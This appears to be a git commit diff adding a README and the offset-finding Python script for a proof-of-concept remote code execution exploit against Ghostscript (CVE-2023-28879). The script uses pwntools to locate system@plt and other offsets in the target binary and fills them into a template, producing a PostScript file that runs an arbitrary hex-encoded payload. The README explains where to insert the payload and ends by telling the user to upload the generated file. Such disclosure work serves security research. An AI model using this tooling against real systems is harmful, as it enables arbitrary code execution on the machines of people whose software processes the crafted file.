f2d14e97f5cb9e52bbd0e092c7856709731f4ccb
hpe <hpe@almond.eu>
2023-06-16 13:37:11 +0200

    Second version of the exploit

--- Ghostscript_rce/Readme.md
+++ Ghostscript_rce/Readme.md
@@ -1,4 +1,9 @@
 # RCE in Ghostscript (CVE-2023-28879)
 
+This is a proof-of-concept for CVE-2023-28879, an Arbitrary Code Execution in Ghostscript. It will generate a Postscript file that runs an arbitrary payload when read by Ghostscript version<10.01.1.
+(Tested on version 9.55, 9.56, 10.0.0 and 10.1.0)
+
 Details: https://offsec.almond.consulting/ghostscript-cve-2023-28879.html
 
+The getoffset.py script should be run against the ghostscript binary or the gs library to get the correct offset.
+Afterwards, the final-poc.ps file will be generated. Your (hex encoded) payload should be inserted at line 73 and onwards.
---
+++ Ghostscript_rce/getoffset.py
@@ -0,0 +1,45 @@
+#!/usr/bin/env python
+# python offset.py /path/to/gs/binary
+# or
+# python offset.py /path/to/libgs
+
+# thanks to Laluka for the help
+
+from pwn import *
+from sys import argv
+
+if len(argv) != 2:
+    print("Usage: python {argv[0]} /path/to/gs_bin or libgs")
+    exit(1)
+
+
+elf_path = argv[1]
+
+# Load the ELF file
+elf = ELF(elf_path)
+
+# Get the address of the PLT
+init_addr = elf.get_section_by_name('.init').header.sh_addr
+print(".init start address: 0x{:x}".format(init_addr))
+
+# Get the address of system@plt
+system_plt_addr = elf.plt['system']
+print("system@PLT address: 0x{:x}".format(system_plt_addr))
+libc_plt_offset = system_plt_addr - init_addr
+print("Offset from .init start addr to system@plt: 0x{:x} == {:d}".format(libc_plt_offset, libc_plt_offset))
+
+f_addr_s_std_noseek = elf.functions["s_std_noseek"]
+print("f_addr_s_std_noseek address: 0x{:x}".format(f_addr_s_std_noseek.address))
+f_addr_s_std_noseek_offset = f_addr_s_std_noseek.address - init_addr
+print("Offset from .init start addr to f_addr_s_std_noseek: 0x{:x} == {:d}".format(f_addr_s_std_noseek_offset, f_addr_s_std_noseek_offset))
+
+with open("final-poc.ps.template", "r") as f:
+    final_file = f.read().strip()
+
+final_file = final_file.replace("F_ADDR_S_STD_NOSEEK_OFFSET", str(f_addr_s_std_noseek_offset))
+final_file = final_file.replace("LIBC_PLT_OFFSET", str(libc_plt_offset))
+
+with open("final-poc.ps", "w") as f:
+    f.write(final_file)
+
+print("Now try to upload the final-poc.ps")
